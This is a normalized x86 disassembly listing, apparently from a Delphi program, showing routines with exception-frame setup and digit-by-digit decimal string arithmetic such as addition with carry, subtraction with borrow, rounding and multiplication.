mov eax [ rw-data ]
call sub_405eac
mov eax [ ebp - 0x4c ]
call sub_469cc8
sub_46a0af
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_46a0d0
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x48 ] ebx
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_46a157
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x22 ]
mov eax esi
call sub_46a4f4
mov ax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x44 ]
lea eax [ ebp - 0x22 ]
mov cx [ ebp + 0xc ]
call sub_46c214
test al al
jne r-xdata
add esp 0xfffffff0
call sub_403570
lea ecx [ ebp - 0x44 ]
xor edx edx
mov eax edi
call sub_469fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a15e
lea eax [ ebp - 0x48 ]
call sub_403f9c
retn
lea edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_405eac
mov eax [ ebp - 0x48 ]
call sub_469cc8
sub_46a15e
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_46a180
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ ecx + 0x4 ]
mov ecx eax
xor edx edx
mov eax esi
call sub_469fc0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_46a1ca
mov eax eax
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46a2f6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4151c8
xor eax eax
push ebp
push sub_46a2d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4151d8
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415264
test al al
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4151c8
xor eax eax
push ebp
push sub_46a2ac
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x5
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4151e4
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push 0x8
mov cx 0x20
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a008
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4151d0
retn
push 0x20
push 0x8
lea ecx [ ebp - 0x2c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415270
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a0d0
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] ax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a2e0
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4151d0
retn
sub_46a302
mov eax eax
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46a41e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
mov edx [ ebp - 0x4 ]
cmp ax [ edx + 0x4 ]
jne r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414d54
mov eax esi
sub ax 0x8
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x8 ]
call sub_469db8
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x18 ]
call sub_4047f4
mov ecx [ ebp - 0x18 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_415218
jmp r-xdata
sub ax 0xf8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a425
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403fc0
lea eax [ ebp - 0x18 ]
call sub_4046a8
retn
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x8 ]
call sub_469db8
mov ecx [ ebp - 0x20 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41520c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4151c8
xor eax eax
push ebp
push sub_46a3e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x14 ] 0x5
mov eax [ ebx + 0x8 ]
add eax 0x4
call sub_46a550
fstp [ ebp - 0xc ]
fwait
push esi
lea ecx [ ebp - 0x14 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4151e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4151d0
retn
sub_46a42e
mov eax eax
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ax [ ebx + 0x4 ]
mov [ edi ] ax
mov ecx [ esi + 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a180
mov [ edi + 0x8 ] eax
mov edx esi
mov eax ebx
call sub_4151f8
test al al
je r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_4151d8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_46a47c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx 0x1
jb r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_469d08
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_469d3c
jmp r-xdata
dec ebx
je r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_469d48
jmp r-xdata
dec ebx
je r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_469d74
jmp r-xdata
jmp r-xdata
call sub_41519c
sub_46a4d4
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_469da0
mov edx [ ebp + 0x8 ]
mov [ edx ] al
pop esi
pop ebx
pop ebp
retn 0x4
sub_46a4f4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46a542
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46bd78
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a549
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov eax [ ebp - 0x4 ]
mov edx ebx
call sub_469c40
sub_46a550
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46a598
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_46ccc4
mov eax [ ebp - 0xc ]
call sub_409758
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a59f
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
sub_46a5a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46a6c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404184
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4045a0
mov edi eax
test di di
jne r-xdata
add si di
mov eax [ ebp - 0x4 ]
call sub_40425c
mov edi eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_403ff0
cmp si di
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_40425c
movsx edx si
cmp eax edx
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_40445c
movsx edx si
dec edx
add eax edx
lea edx [ eax + 0x1 ]
cmp [ edx ] 0x35
jb r-xdata
test si si
jle r-xdata
mov dl [ eax ]
inc edx
mov [ eax ] dl
jmp r-xdata
cmp [ eax ] 0x39
jbe r-xdata
cmp [ eax ] 0x39
ja r-xdata
mov eax [ ebp - 0x8 ]
push eax
movsx ecx si
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4044bc
jmp r-xdata
mov [ eax ] 0x30
lea eax [ ebp - 0x10 ]
push eax
movsx ecx si
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4044bc
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4042a8
jmp r-xdata
cmp bl [ eax ]
je r-xdata
cmp bl [ eax ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a6cd
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc0
retn
dec esi
dec eax
cmp bl [ eax ]
je r-xdata
mov [ eax ] 0x30
mov dl [ eax ]
inc edx
mov [ eax ] dl
sub_46a6e0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_403ff0
jmp r-xdata
mov eax [ ebx ]
call sub_40425c
dec eax
jle r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
cmp [ eax ] 0x30
je r-xdata
push ebx
mov eax [ ebx ]
call sub_40425c
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4044bc
sub_46a71c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40444c
mov eax [ ebp - 0x8 ]
call sub_40444c
xor eax eax
push ebp
push sub_46a7c2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_46a6e0
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_404034
mov eax [ ebp - 0x4 ]
call sub_40425c
mov ebx eax
mov eax [ ebp - 0x8 ]
call sub_40425c
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x8 ]
call sub_40425c
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40425c
cmp ebx eax
jle r-xdata
mov ebx 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407fdc
mov ebx eax
or ebx 0xffffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a7c9
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403fc0
retn
sub_46a7d0
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_40444c
mov eax [ ebp - 0x8 ]
call sub_40444c
xor eax eax
push ebp
push sub_46a968
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46a71c
dec eax
jle r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x4 ]
call sub_403ff0
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403ff0
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
mov eax [ ebp + 0xc ]
mov [ eax ] esi
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_403ff0
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x8 ]
call sub_403ff0
mov eax [ ebp + 0x10 ]
mov [ eax ] esi
mov eax [ ebp + 0xc ]
mov [ eax ] edi
jmp r-xdata
test esi esi
jle r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_404184
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov edx [ edx ]
call sub_4045a0
mov esi eax
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_404184
mov eax [ ebp - 0x14 ]
mov edx [ ebp + 0x1c ]
mov edx [ edx ]
call sub_4045a0
mov edi eax
test esi esi
jne r-xdata
test edi edi
jle r-xdata
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx ebx
call sub_404184
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov eax [ eax ]
xor ecx ecx
call sub_40cd88
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_403ff0
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
sub eax esi
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0x10 ]
dec [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xffffff01
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a96f
lea eax [ ebp - 0x24 ]
mov edx 0x6
call sub_403fc0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x24 ]
mov edx ebx
call sub_404184
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0x1c ]
mov eax [ eax ]
xor ecx ecx
call sub_40cd88
mov edx [ ebp - 0x20 ]
mov eax [ ebp + 0x1c ]
call sub_403ff0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
sub eax edi
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov eax [ ebp + 0xc ]
dec [ eax ]
sub_46a97c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x1 ] dl
mov esi [ ebp + 0x8 ]
mov ebx eax
sub bl 0x30
mov al [ ebp - 0x1 ]
sub al 0x30
add bl al
add bl [ edi ]
cmp bl 0x9
jbe r-xdata
mov eax esi
mov edx ebx
add dl 0x30
call sub_404184
mov [ edi ] 0x0
mov eax esi
mov edx ebx
sub dl 0xa
add dl 0x30
call sub_404184
mov [ edi ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax esi
mov edx r-xdata
call sub_403ff0
cmp [ esi ] 0x0
jne r-xdata
sub_46a9e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov edi [ ebp + 0x8 ]
mov dl [ ebp - 0x1 ]
sub dl 0x30
add dl [ esi ]
mov ebx eax
sub bl 0x30
sub bl dl
cmp bl 0x9
jbe r-xdata
mov eax edi
mov edx ebx
add dl 0x30
call sub_404184
mov [ esi ] 0x0
mov eax edi
mov edx ebx
add dl 0xa
add dl 0x30
call sub_404184
mov [ esi ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46aa38
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46ab6f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ff0
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_4043a8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ab76
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
mov edx ebx
call sub_403ff0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4043a8
jne r-xdata
mov [ ebp - 0x19 ] 0x0
mov eax ebx
call sub_40445c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_40445c
mov [ ebp - 0x10 ] eax
mov eax ebx
call sub_40425c
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_40425c
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_42a4e0
mov ebx eax
mov eax esi
call sub_403f9c
test ebx ebx
jle r-xdata
cmp [ ebp - 0x19 ] 0x0
jbe r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0x1
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4042a8
mov [ ebp - 0x1a ] 0x30
mov edx [ ebp - 0xc ]
mov al [ edx + eax ]
mov [ ebp - 0x1a ] al
jmp r-xdata
mov [ ebp - 0x1b ] 0x30
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov al [ eax + edx ]
mov [ ebp - 0x1b ] al
jmp r-xdata
cmp ebx [ ebp - 0x14 ]
jg r-xdata
mov eax edi
sub eax ebx
mov edx [ ebp - 0x14 ]
sub edx ebx
mov [ ebp - 0x18 ] edx
cmp edi ebx
jl r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x19 ]
mov dl [ ebp - 0x1b ]
mov al [ ebp - 0x1a ]
call sub_46a97c
mov ecx [ esi ]
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_4042a8
inc ebx
dec [ ebp - 0x20 ]
jne r-xdata
sub_46ab98
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46ad76
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
call sub_46a71c
test eax eax
jl r-xdata
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404034
lea eax [ ebp - 0x8 ]
mov edx edi
call sub_404034
mov eax esi
mov edx r-xdata
call sub_403ff0
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404034
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404034
mov eax esi
call sub_403f9c
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_403ff0
mov eax esi
mov ecx [ ebp - 0xc ]
mov edx r-xdata
call sub_4042a8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043a8
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043a8
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043a8
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043a8
jne r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_403ff0
jmp r-xdata
mov [ ebp - 0x1d ] 0x0
mov eax [ ebp - 0x8 ]
call sub_40445c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
call sub_40445c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
call sub_40425c
mov edi eax
mov eax [ ebp - 0xc ]
call sub_40425c
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_42a4e0
mov ebx eax
mov eax esi
call sub_403f9c
test ebx ebx
jle r-xdata
mov eax esi
mov edx [ ebp - 0xc ]
call sub_403ff0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ff0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ad7d
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403fc0
retn
cmp [ esi ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov ebx 0x1
mov eax esi
mov edx r-xdata
call sub_403ff0
mov [ ebp - 0x1e ] 0x30
mov edx [ ebp - 0x10 ]
mov al [ edx + eax ]
mov [ ebp - 0x1e ] al
jmp r-xdata
mov [ ebp - 0x1f ] 0x30
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov al [ eax + edx ]
mov [ ebp - 0x1f ] al
jmp r-xdata
cmp ebx [ ebp - 0x18 ]
jg r-xdata
mov eax edi
sub eax ebx
mov edx [ ebp - 0x18 ]
sub edx ebx
mov [ ebp - 0x1c ] edx
cmp edi ebx
jl r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x1d ]
mov dl [ ebp - 0x1f ]
mov al [ ebp - 0x1e ]
call sub_46a9e8
mov ecx [ esi ]
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4042a8
inc ebx
dec [ ebp - 0x24 ]
jne r-xdata
sub_46ad9c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46af75
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x1d ] al
lea eax [ ebp - 0x1c ]
push eax
mov eax ebx
call sub_40425c
push eax
mov eax esi
call sub_40425c
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx esi
mov eax ebx
call sub_46a7d0
mov eax [ ebp - 0x1c ]
call sub_40445c
mov [ ebp - 0x14 ] eax
mov esi 0x1
xor edi edi
mov ebx [ ebp - 0x10 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax edi
xor edx edx
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_4083a0
cmp [ ebp - 0x8 ] 0xffffff01
je r-xdata
mov eax [ ebp - 0x18 ]
call sub_4083f0
mov edx [ ebp - 0x14 ]
movzx edx [ edx + ebx ]
sub edx 0x30
imul edx
imul esi
add edi eax
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
mov esi eax
dec ebx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46af7c
lea eax [ ebp - 0x40 ]
mov edx 0x5
call sub_403fc0
lea eax [ ebp - 0x24 ]
call sub_403f9c
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403fc0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40425c
mov ebx eax
sub ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
test ebx ebx
jle r-xdata
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_402b3c
lea eax [ ebp - 0x2c ]
mov dl [ ebp - 0x1d ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x2c ]
lea eax [ ebp - 0x28 ]
mov cl 0x2
call sub_402b0c
lea edx [ ebp - 0x28 ]
lea eax [ ebp - 0x24 ]
call sub_404200
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov eax [ ebp - 0x4 ]
call sub_4042a8
jmp r-xdata
test ebx ebx
jge r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx ebx
mov edx 0x1
call sub_4044bc
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
mov dl [ ebp - 0x1d ]
call sub_404184
push [ ebp - 0x34 ]
lea eax [ ebp - 0x38 ]
push eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp - 0x8 ]
call sub_4044bc
push [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40431c
jmp r-xdata
lea eax [ ebp - 0x3c ]
mov dl [ ebp - 0x1d ]
call sub_404184
push [ ebp - 0x3c ]
lea ecx [ ebp - 0x40 ]
mov edx ebx
neg edx
mov al 0x30
call sub_40464c
push [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40431c
sub_46af88
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov eax esi
call sub_40425c
mov [ ebp - 0xa ] ax
mov eax esi
call sub_40445c
movsx edi [ ebp - 0xa ]
mov edx edi
dec edx
add eax edx
mov [ ebp - 0x8 ] eax
mov edx edi
inc edx
mov eax ebx
call sub_4045e8
mov eax [ ebx ]
call sub_40445c
movsx edx [ ebp - 0xa ]
add eax edx
mov [ ebp - 0x4 ] eax
push ecx
push edi
push esi
push ebx
mov bh 0xa
mov edi [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov cx [ ebp - 0xa ]
mov dx 0x0
add dl 0x30
mov [ edi ] dl
pop ebx
pop esi
pop edi
pop ecx
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
mov al [ esi ]
sub esi 0x1
sub al 0x30
mul [ ebp + 0xc ]
add ax dx
mov dx 0x0
div bh
mov dl al
add ah 0x30
mov [ edi ] ah
sub edi 0x1
sub cx 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ebx
mov eax [ ebx ]
call sub_40425c
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4044bc
cmp cx 0x0
je r-xdata
sub_46b03c
push ebp
mov ebp esp
push ecx
mov ecx 0xa
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46b2a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x20 ]
push eax
mov eax esi
call sub_40425c
push eax
mov eax edi
call sub_40425c
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx edi
mov eax esi
call sub_46a7d0
mov eax [ ebp - 0x1c ]
call sub_40425c
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x20 ]
call sub_40425c
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
call sub_40445c
mov edi eax
lea eax [ ebp - 0x10 ]
call sub_403f9c
mov esi [ ebp - 0xc ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax ebx
mov edx [ ebp - 0x14 ]
call sub_403ff0
jmp r-xdata
cmp [ ebp - 0x8 ] 0x9
jge r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov al [ edi + esi ]
sub al 0x30
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_46af88
mov edx [ ebp - 0x34 ]
lea eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
call sub_4042a8
mov eax [ ebp - 0x1c ]
call sub_4083f0
xor edx edx
mov dl [ edi + esi ]
sub edx 0x30
imul edx
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_4083a0
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
call sub_4042a8
